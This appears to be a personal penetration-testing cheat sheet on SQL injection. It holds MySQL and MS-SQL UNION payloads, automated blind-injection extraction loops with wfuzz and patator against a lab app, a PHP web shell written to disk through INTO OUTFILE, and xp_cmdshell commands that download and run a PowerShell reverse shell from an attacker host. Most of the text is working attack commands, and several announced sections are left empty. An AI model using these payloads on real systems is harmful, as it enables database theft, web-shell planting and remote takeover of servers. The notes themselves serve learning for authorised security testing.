# Web Application Attacks
1. SQL Injection
2. Blind SQL Injection
3. Local File Inclusion
4. Command Injection
5. LDAP Injection 
6. XSS (TBD)

## SQL Injection

### Manual Testing 
Test characters and strings

```bash
'                       # a single quote, treated as a string terminator
;                       # a semi-colon, treated as a query terminator
#                       # a comment, comments out anything that comes after that character in that line
-- -                    # a comment, same as above
/**/                    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1                 # an AND statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1                  # an OR statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)                # delays the response by the number of seconds mentioned in the sleep command. 
```
Let's combine the terminators and comment characters above.

```bash
'                       # Try a single quote only to see any error, because of string termination  
';                      # Try a single quote and semi-colon to see any error, because of query termination
';-- -                  # Try a single quote and semi-colon and comment after the character to see if this succeeds. 
AND 1 = 1               # Try AND tru statement to see any error or success 
OR 1 = 1                # Try OR statement to see any error or success
' AND 1=1;-- -          # Try adding AND condition to see if this succeeds.  
' OR 1=1; -- -          # Try adding OR condition to see if this succeeds. 
1 and sleep(5)          # Try adding AND operator, sleep command to look at the time to get the response back
1' and sleep(5);-- -    # Try adding AND operator, sleep command plus string terminator, query terminator, and comment
```

Use OR statement to get all data from this vulnerability

```bash 
# Try to add a single quote as a string terminator to terminate the original query and add OR Statement for true condition. 
?param=' OR '1'='1    
?param=' OR 1=1 # 
?param=' OR 1=1 -- -
```

### Exploitation - UNION based Attack 
The ORDER BY is used to enumerate the number of columns for UNION based SQL Injection attack.
 
```bash
?param=<value> order by 1
?param=<value> order by 1,2
?param=<value> order by 1,2,3
... (Until you see some column error)

?param=<value>' order by 1-- -
?param=<value>' order by 1,2-- -
?param=<value>' order by 1,2,3-- -
...(Until you see some column error)

There are some variations 
?param=<value>' order by 1 -- -
?param=<value>' order by 1;-- -
?param=<value>' order by 1# 
?param=<value>' order by 1;# 

``` 

Once you see the number of teh columns, you can construct UNION based query using the number of columns. In this case, the number of the columns are 2. 
```
UNION SELECT 1,2-- -
UNION SELECT 1,2;-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2;-- -
```

####  MySQL UNION Query 
Let's explore UNION clause to create your SQL Injection query on MySQL database. 

```bash
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

# @@Version
UNION SELECT 1,@@version-- -

# user() 
UNION SELECT 1,user()-- -

# table_name from information_schema.tables
UNION SELECT 1,table_name from information_schema.tables-- -
UNION SELECT 1,table_name,3 from information_schema.tables-- -

# column_name from information_schema.columns where table_name='<table name>'
UNION SELECT 1,column_name from information_schema.columns where table_name='users'-- -
UNION SELECT 1,column_name,3,4,5 from information_schema.columns where table_name='users'-- - # In case for 5 columns

# select <column name> from <table names>
UNION SELECT 1, username from users-- -
UNION SELECT 1, username, password from users-- -

# --- MySQL Code Execution Command - Ensure you know a file path --- 

# Browser
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'-- -
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE  "/var/www/html/backdoor.php"-- -
# http://192.168.128.10/backdoor.php?cmd=ipconfig 
	
# BURP (URL should be encoded)
POST /issue/checkByPriority?priority=Normal' union all select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/srv/http/backdoor.php'-- -
```

####  MS-SQL UNION Query 
Let's explore UNION clause to create your SQL Injection query on MS-SQL database. 

```bash
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

' ORDER by 1 -- -
' ORDER by 2 -- -
...
' UNION ALL select 1 --
' UNION ALL select 2 --
...
' UNION ALL select 1 -- 
' UNION ALL select 1,2 -- 
...

# Check the table format 
' union select 1,2 from master..sysdatabases -- -
' union select Null,Null from master..sysdatabases -- -

# Check the version number
' union select @@version,2 -- -

# Current User
' union select CURRENT_USER,2 from master..sysdatabases -- -

# Database name(s)
' union select name,2 from master..sysdatabases -- -

# Tables name(s) (with music database)
' union SELECT name,2 FROM music..sysobjects WHERE xtype = 'U' -- -

# Column name(s) (with users table)
'union SELECT name,2 FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- -

# Data in the Column
' union SELECT name, 2 from users -- -   # with column name "name" 
' union SELECT  pass, 2 from users -- -  # with column name "pass" 

# ---- MS-SQL Code Execution Command

' union SELECT  pass, 1 from users; EXEC sp_configure 'show advanced options',1 -- -
' union SELECT  pass, 1 from users; RECONFIGURE -- -
' union SELECT  pass, 1 from users; EXEC sp_configure 'xp_cmdshell',1 -- -
' union SELECT  pass, 1 from users; RECONFIGURE -- -

# @Kali
sudo tcpdump -I tun0 
' union SELECT  pass, 1 from users; EXEC master.dbo.xp_cmdshell 'ping -n 5 192.168.119.128'-- -

# Powershell based reverse shell
cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1

# At the end of the powershell code, add the following: 
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.128 -Port 1234

sudo python3 -m http.server 80
	
nc -nvlp 1236
' union SELECT  pass, 1 from users; EXEC master.dbo.xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://192.168.119.128/shell.ps1')"-- -
```

## Blind SQL Injection on MySQL 
### Boolean based  
This technique is very useful when the tester finds a Blind SQL Injection situation in which nothing is known on the outcome of an operation. The most important element of Boolean based attacks is <b>AND</b>, because it only gives a true answer in case that both sides of the operator are true. 

```bash

# Try the following query first 
?param=<value> AND 1=1 #      
?param=<value> AND 1=1 -- - 
?param=<value>' AND 1=1 #      
?param=<value>' AND 1=1 -- - 

# Try the following query instead, since you will need some successful query.
?param=<value>' AND 1=1 #
?param=<value>' AND 1=1 -- -

?id=1' AND 1=1 #
?id=1' AND 1=1 -- -

You should see the successful query and response. 


# Check database version number
1' and substring(@@version,1,1)=4-- -
1' and substring(@@version,1,1)=5-- -
# This will tell you the version number of database with the successful query.
# We use substring(string, position, length) function. 


# Check the length of database name

1' and length(database())=<num> -- - 
1' and length(database())=1 -- - 
...
# patator
/opt/fuzz/patator/patator.py http_fuzz url="https://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361
/opt/fuzz/patator/patator.py http_fuzz url="http://127.0.0.1/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=jvvu7k4v0pj33l3ptijc3m3dn5; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
# Adjust the number of length (currently 10)


# Check database name
1' AND ascii(substr(database(),1,1))>90 -- -
1' AND ascii(substr(database(),1,1))=100 -- -
...
# wfuzz
for i in $(seq 1 10); do wfuzz -c -z range,32-127 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low --hw=901 "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}' ; done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="https://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring(database(),RANGE0,1))='RANGE1&Submit=Submit#" method="GET" header="Cookie:PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-4" 1="int:1-256" -x ignore:clen=4361 -l ./patator
cd patator
cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | sort | cut -d ":" -f 2 |  awk '{printf("%c",$1)}'


#Check all table name under current database
# Assume the number of characters used for table name is less than 10 and the number of table name is also less than 10

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo ""; done

# patator
/opt/fuzz/patator/patator.py  http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT table_name from information_schema.tables where table_schema='dvwa' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-1" 1="int:1-20" 2="int:1-256" -x ignore:clen=4361 -l ./patator
# adjust the number of table to find (currently 2) and the number of characters in each table name (currently 20)

cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the number of table names (currently 5) 


# Check the number of the columns under the table name 'users'

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and (SELECT count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361 -l ./patator
# adjust the number of column to find (currently 10) 


# Check all column names under the table name 'users'

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT column_name from information_schema.columns where table_schema='dvwa' and table_name='users' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256"  -x ignore:clen=4361 -l ./patator
# adjust the number of columns to find (currently 7) and the number of characters in each column name (currently 20)

cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the colum number (currently 5)


# Check the number of the data in one column 

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and (SELECT count(first_name) from dvwa.users)='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361 -l ./patator
# adjust the number of column to find (currently 10) 


# Get the content from one column of one table.

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 50); do wfuzz -v -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select user_id from dvwa.users limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#"| grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT first_name from dvwa.users LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-7" 1="int:1-50" 2="int:1-256" -x ignore:clen=4361 -l ./patator
# adjust the number of columns to find (currently 7) and the number of characters in each column name (currently 50)

cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the colum number (currently 5)

```

## Blind SQL Injection on MS-SQL
### Boolean based  

### Boolean based  
Adjust the query and commands using https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

### Time based 









